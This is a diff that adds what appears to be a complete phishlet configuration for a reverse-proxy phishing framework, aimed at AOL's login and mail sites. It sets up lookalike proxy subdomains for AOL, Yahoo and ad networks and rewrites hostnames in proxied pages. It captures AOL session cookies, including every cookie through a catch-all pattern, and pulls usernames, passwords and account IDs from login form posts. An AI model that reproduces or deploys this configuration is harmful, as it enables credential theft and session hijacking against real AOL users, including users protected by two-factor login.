@@ -1,0 +1,53 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'aolcdn.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'yimg', orig_sub: 'yimg', domain: 'yimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'yo', orig_sub: 'yo', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'membernotifications', orig_sub: 'membernotifications', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'criteo', orig_sub: 'criteo', domain: 'criteo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'dc', orig_sub: 'dc', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www2', orig_sub: 'www2', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gs', orig_sub: 'gs', domain: 'googleadservices.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'scs', orig_sub: 'scs', domain: 'googlesyndication.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gapis', orig_sub: 'gapis', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: true}
+
+
+sub_filters:
+  - {triggers_on: 'www.aol.com', orig_sub: 'www', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/json','text/javascript','application/javascript',application/x-javascript]}
+  - {triggers_on: 'mail.aol.com', orig_sub: 'mail', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/json','text/javascript','application/javascript',application/x-javascript]}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/json','text/javascript','application/javascript',application/x-javascript]}
+
+auth_urls:
+  - '/'
+
+auth_tokens:
+  - domain: '.aol.com'
+    keys: ["YM.TZ","YM.SSRBDGT","YM.CLIENT.PARAMS","OTHP","weathergeo","tbla_id","rxx","OTH","GUCS","GUC","gpp_sid","gpp","F","cto_bundle","cmp","axids","A3","A1S","A1","__gpi","__gads","__eoi",'.*,regexp']
+  - domain: '.mail.aol.com'
+    keys: ["YM.TZ","YM.SSRBDGT","YM.CLIENT.PARAMS","OTHP","weathergeo","tbla_id","rxx","OTH","GUCS","GUC","gpp_sid","gpp","F","cto_bundle","cmp","axids","A3","A1S","A1","__gpi","__gads","__eoi",'.*,regexp']
+  - domain: 'aol.com'
+    keys: ["YM.TZ","YM.SSRBDGT","YM.CLIENT.PARAMS","OTHP","weathergeo","tbla_id","rxx","OTH","GUCS","GUC","gpp_sid","gpp","F","cto_bundle","cmp","axids","A3","A1S","A1","__gpi","__gads","__eoi",'.*,regexp']
+  - domain: 'mail.aol.com'
+    keys: ["YM.TZ","YM.SSRBDGT","YM.CLIENT.PARAMS","OTHP","weathergeo","tbla_id","rxx","OTH","GUCS","GUC","gpp_sid","gpp","F","cto_bundle","cmp","axids","A3","A1S","A1","__gpi","__gads","__eoi",'.*,regexp']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'yid'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.aol.com'
+  path: '/'
